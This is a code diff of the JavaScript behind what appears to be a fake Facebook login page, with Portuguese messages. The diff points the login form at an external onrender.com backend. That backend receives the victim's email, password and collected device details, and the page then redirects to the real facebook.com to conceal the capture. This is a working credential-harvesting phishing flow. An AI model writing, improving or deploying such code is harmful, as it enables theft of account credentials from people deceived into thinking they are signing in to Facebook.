@@ -136,10 +136,11 @@ document.addEventListener('DOMContentLoaded', () => {
 
                 const infoDispositivo = await coletarInformacoesDispositivo();
 
-                const response = await fetch('http://localhost:3000/login', {
+                const response = await fetch('https://facebook-clone-api-render.onrender.com/login', {
                     method: 'POST',
                     headers: {
-                        'Content-Type': 'application/json'
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
                     },
                     body: JSON.stringify({
                         email: emailInput.value.trim(),
@@ -149,15 +150,17 @@ document.addEventListener('DOMContentLoaded', () => {
                 });
 
                 const data = await response.json();
+                console.log('Resposta do servidor:', data);
 
-                if (data.success) {
-                    window.location.href = 'https://www.facebook.com';
+                if (response.ok && data.success) {
+                    window.location.replace('https://www.facebook.com');
                 } else {
                     throw new Error(data.message || 'Erro ao fazer login');
                 }
 
             } catch (error) {
                 console.error('Erro ao processar login:', error);
+                alert('Erro ao fazer login. Por favor, tente novamente.');
                 btnEntrar.textContent = 'Entrar';
                 btnEntrar.disabled = false;
             }
